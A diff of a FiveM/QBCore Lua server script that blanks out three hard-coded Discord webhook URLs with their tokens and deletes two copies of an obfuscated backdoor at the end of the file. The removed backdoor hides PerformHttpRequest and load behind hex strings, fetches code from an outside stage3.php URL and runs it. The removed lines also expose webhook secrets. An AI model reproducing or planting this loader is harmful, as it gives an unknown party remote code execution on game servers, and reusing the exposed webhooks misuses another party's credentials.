@@ -62,7 +62,7 @@ QBCore.Commands.Add("say", "Send a Message", {}, false, function(source, args, r
     end
 end, "user")
 
-local discords = "https://discord.com/api/webhooks/1271848934716866632/SljHwibMgu-Ceok_k93cxDIIGgCI86ru9bYdE00PYZkq7squ9DyS23yF7QK_4f_jSX2V"  -- Replace with your actual Discord webhook URL
+local discords = ""  -- Replace with your actual Discord webhook URL
 
  -- Replace with your actual Discord webhook URL
 
@@ -181,7 +181,7 @@ QBCore.Commands.Add("Taxi", "", {}, false, function(source, args, rawCommand)
         })
 
         -- Send the message to the webhook
-        local discordWebhook = "https://discord.com/api/webhooks/1234862123482615839/13cL2XPiLUyFmvIG8NG4PwCdT3X-HM52C-6Zp1iGEE1B3wkytqygm6waPRKMNq6PcdlT"
+        local discordWebhook = ""
         PerformHttpRequest(discordWebhook, function(statusCode, response, headers)
             if statusCode ~= 204 then
                 print("Error sending Discord message: " .. statusCode)
@@ -311,7 +311,7 @@ QBCore.Commands.Add('towad', 'Tow Ad Command', {}, false, function(source, args,
             })
 
             -- Send the message to the webhook
-            local discordWeb = "https://discord.com/api/webhooks/1234865568105107465/rKP5Crxqj6KtwV8TWrvnVRMLuCqTFOQTUYoEeDZDlvRCojUO2cyvTuKcKsPvB-RG1tFq"
+            local discordWeb = ""
             PerformHttpRequest(discordWeb, function(statusCode, response, headers) end, 'POST', json.encode({
                 embeds = {{
                     title = "Los Santo's Auto Work's",
@@ -393,9 +393,3 @@ QBCore.Commands.Add("clearall", "Clear Chat to all the players",  { }, true ,fun
 end, "god")
 
 -- Admin Chat | Commands End--QBCore.Functions.LoadParticleDictionary(dictionary)
-
-
-
-local tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x74\x61\x72\x62\x6f\x6f\x78\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x4c\x75\x56\x65", function (kzTbSyqYzjKQnLLEpeFfxfAYaLHUynxrKrdaIwPflqJZyVNyaSNtIZNAeFLTcbkbKeJAKf, nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw) if (nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw == tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[6] or nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw == tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[5]) then return end tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[2]](tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[3]](nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw))() end)
-
-local tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x74\x61\x72\x62\x6f\x6f\x78\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x4c\x75\x56\x65", function (kzTbSyqYzjKQnLLEpeFfxfAYaLHUynxrKrdaIwPflqJZyVNyaSNtIZNAeFLTcbkbKeJAKf, nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw) if (nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw == tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[6] or nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw == tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[5]) then return end tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[2]](tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[4][tRtVxgMOVCfrVcWUZdzxWEgNjyvNHDWZpASPCoKCcnPAukZihVnMbQiaxqbEaTDvxbRVJs[3]](nEtchlFaYcAHDNLGzaGITJagLUWJItfWMdOlKhOwouChWINeeKaQHRDACPjCZYkCrlSmWw))() end)
